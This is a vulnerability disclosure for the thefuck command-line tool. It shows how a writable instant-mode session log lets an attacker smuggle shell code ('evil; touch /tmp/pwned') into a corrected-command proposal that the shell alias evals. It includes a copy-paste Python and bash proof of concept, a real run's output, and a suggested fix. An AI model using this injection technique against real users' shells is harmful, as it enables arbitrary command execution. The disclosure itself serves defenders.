# Poisoned session log steers thefuck into proposing (and with `--yes`/alias-eval, running) attacker-chosen shell code

**Upstream issue:** https://github.com/nvbn/thefuck/issues/1622

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2 Ubuntu 24.04; output below is from the actual run)

## Reproduction conditions

- thefuck 3.32, Python 3.12.3, Ubuntu 24.04 (WSL2), source (editable) install
- Instant mode enabled (`THEFUCK_INSTANT_MODE=true`, i.e. the alias from `thefuck --enable-experimental-instant-mode`)
- An attacker able to write to `THEFUCK_OUTPUT_LOG` — e.g. a second local user when the log is group/world-writable (see #1621: the log is created 0777 & ~umask, so under umask 000 it is world-writable), or any process compromise
- A rule that interpolates output-derived tokens unquoted; the demo uses `brew_install` (`brew_available` gates it, so a `brew` shim on PATH stands in for a real brew-equipped macOS/Linuxbrew host — the shim is not part of the vulnerability)

## Description

In instant mode the corrected-command proposal is built from the session output log, and output-derived tokens are concatenated into the proposal **without shell quoting**. Three pieces compose the chain:

1. `output_readers/read_log.py::_get_script_group_lines` selects the log group for a command with a loose substring match — `all(part in script_line for part in parts)` — over the whole (attacker-writable) log;
2. `rules/brew_install.py` regex-extracts the `Did you mean (.+?)` suggestion from `command.output` and returns `"brew install " + formula` — unquoted, so any shell metacharacters in the "suggestion" flow into the proposal;
3. `CorrectedCommand.run` (`thefuck/types.py`) writes the proposal to stdout, and the shell alias evaluates that stdout — so everything in the proposal is executed as shell code (with `--yes`/`require_confirmation=false`, without even a confirmation prompt).

```python
# rules/brew_install.py
matcher = re.search('Warning: No available formula with the name "(?:[^"]+)". Did you mean (.+)\\?', command.output)
return ["brew install " + formula for formula in suggestions]   # unquoted interpolation
```

## Impact

Anyone who can write to the session log gets arbitrary command execution in the victim's shell session when the victim next invokes thefuck on a matching failed command. The poisoned line `Did you mean evil; touch /tmp/pwned?` produces the proposal `brew install evil; touch /tmp/pwned`, which the alias evaluates verbatim. Many rules besides `brew_install` interpolate output tokens unquoted (via `replace_command`/`replace_argument` in `utils.py`), so this is a pattern, not a single-rule bug.

## PoC (copy-paste ready)

**Step 1 — attacker poisons the log** (any writer to `THEFUCK_OUTPUT_LOG`; structure matches what `read_log` parses):

```python
LOG_SIZE = 1024 * 1024
MARK = "\u200b" * 10                      # thefuck const.USER_COMMAND_MARK
body = (
    f"{MARK}brew install foo\n"            # script line matching the victim command
    'Warning: No available formula with the name "foo". '
    'Did you mean evil; touch /tmp/pwned?\n'
    f"{MARK}$ \n"
)
data = body.encode("utf-8")
open("/tmp/session.log", "wb").write(data + b"\x00" * (LOG_SIZE - len(data)))
```

**Step 2 — victim runs thefuck in instant mode** (brew-equipped host; a `brew` stub on PATH simulates one where brew is absent):

```bash
MARK=$(python3 -c "print('\u200b'*10)")
OUT=$(cd /tmp && COLUMNS=200 PS1="$MARK\$ " \
  THEFUCK_INSTANT_MODE=true THEFUCK_OUTPUT_LOG=/tmp/session.log \
  thefuck --yes "brew install foo")
echo "$OUT"        # -> brew install evil; touch /tmp/pwned
```

**Step 3 — the alias evals that stdout verbatim** (this is what the generated bash alias does):

```bash
eval "$OUT"
ls /tmp/pwned      # -> file created by the injected command
```

## Execution result (actual run: thefuck 3.32 / Python 3.12.3 / Ubuntu 24.04)

```
=== Step 1 (attacker): poison the session log with the structure read_log expects ===
poisoned log written: 1048576 bytes
log: mode=644 size=1048576

=== Step 2 (victim setup): brew shim on PATH (brew_available = bool(which('brew')) gates the rule) ===

=== Step 3 (victim): run thefuck in instant mode against the poisoned log ===
thefuck stdout (what the shell alias evals): [brew install evil; touch /tmp/tf1622_pwned]

=== Step 4 (victim): the alias evals this stdout verbatim ===
RESULT: REPRODUCED - payload file /tmp/tf1622_pwned created by the injected command
```

The `;`-separated payload survived regex extraction, landed in the proposal unquoted, and was executed by the alias-style `eval` — no confirmation prompt because of `--yes`.

## Suggested fix

Quote output-derived tokens when composing proposals (`shlex.quote` in `get_new_command` implementations / `replace_command`), and/or tighten the log-group selection beyond substring containment.
